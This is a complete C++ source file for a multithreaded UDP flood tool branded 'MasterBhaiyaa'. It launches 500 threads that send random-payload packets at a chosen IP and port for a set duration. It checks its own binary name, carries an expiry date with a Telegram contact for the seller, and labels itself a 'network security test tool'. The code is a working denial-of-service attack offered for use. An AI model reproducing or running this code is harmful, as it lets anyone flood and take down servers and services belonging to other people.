#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#define THREAD_COUNT 500
#define DEFAULT_PAYLOAD_SIZE 33
#define BINARY_NAME "MasterBhaiyaa"

// Expiration Date
constexpr int EXPIRATION_YEAR = 2054;
constexpr int EXPIRATION_MONTH = 11;
constexpr int EXPIRATION_DAY = 1;

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int payload_size;
};

// Signal handler
void handle_signal(int signal) {
    std::cout << "\n[!] Interrupt received. Stopping security test...\n";
    stop_flag = true;
}

// Check expiration date
void check_expiration() {
    std::tm expiration_date = {};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;

    std::time_t now = std::time(nullptr);
    if (std::difftime(now, std::mktime(&expiration_date)) > 0) {
        std::cerr << "╔════════════════════════════════════════╗\n";
        std::cerr << "║           BINARY EXPIRED!              ║\n";
        std::cerr << "║    Please contact the owner at:        ║\n";
        std::cerr << "║    Telegram: @MasterBhaiyaa            ║\n";
        std::cerr << "╚════════════════════════════════════════╝\n";
        exit(EXIT_FAILURE);
    }
}

// Check if binary has been renamed
void check_binary_name() {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);

    if (len != -1) {
        exe_path[len] = '\0';
        std::string exe_name = std::string(exe_path);
        size_t pos = exe_name.find_last_of("/");

        if (pos != std::string::npos) {
            exe_name = exe_name.substr(pos + 1);
        }

        if (exe_name != BINARY_NAME) {
            std::cerr << "╔════════════════════════════════════════╗\n";
            std::cerr << "║         INVALID BINARY NAME!           ║\n";
            std::cerr << "║    Binary must be named 'MasterBhaiyaa'║\n";
            std::cerr << "╚════════════════════════════════════════╝\n";
            exit(EXIT_FAILURE);
        }
    }
}

// Validate IP Address
bool is_valid_ip(const std::string &ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// Generate dynamic payload per iteration
void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
    buffer.resize(size);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = static_cast<uint8_t>(rand() % 256);
    }
}

// UDP attack function (optimized)
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    // Non-blocking mode for faster attack
    fcntl(sock, F_SETFL, O_NONBLOCK);

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    std::vector<uint8_t> payload;
    generate_payload(payload, config.payload_size);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
    
    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        for (int i = 0; i < 10; i++) {  // **🔥 Sending more packets per loop**
            sendto(sock, payload.data(), payload.size(), 0, 
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
        }
        generate_payload(payload, config.payload_size); // **🔥 Change payload dynamically**
    }

    close(sock);
}

// Main function
int main(int argc, char *argv[]) {
    check_binary_name();
    check_expiration();

    // Print Watermark Header
    std::cout << "╔════════════════════════════════════════╗\n";
    std::cout << "║         MasterBhaiyaa v3.1             ║\n";
    std::cout << "║     The Ultimate Network Test Tool    ║\n";
    std::cout << "║    © 2024-2054 @MasterBhaiyaa          ║\n";
    std::cout << "╚════════════════════════════════════════╝\n\n";

    if (argc < 4 || argc > 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [payload_size]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;

    // Validate IP Address
    if (!is_valid_ip(config.ip)) {
        std::cerr << "Invalid IP address: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "\n=====================================\n";
    std::cout << "      Network Security Test Tool     \n";
    std::cout << "=====================================\n";
    std::cout << "Testing: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Threads: " << THREAD_COUNT << "\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(udp_attack, config);
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Security test completed successfully.\n";
    std::cout << "© @MasterBhaiyaa\n";

    return EXIT_SUCCESS;
}
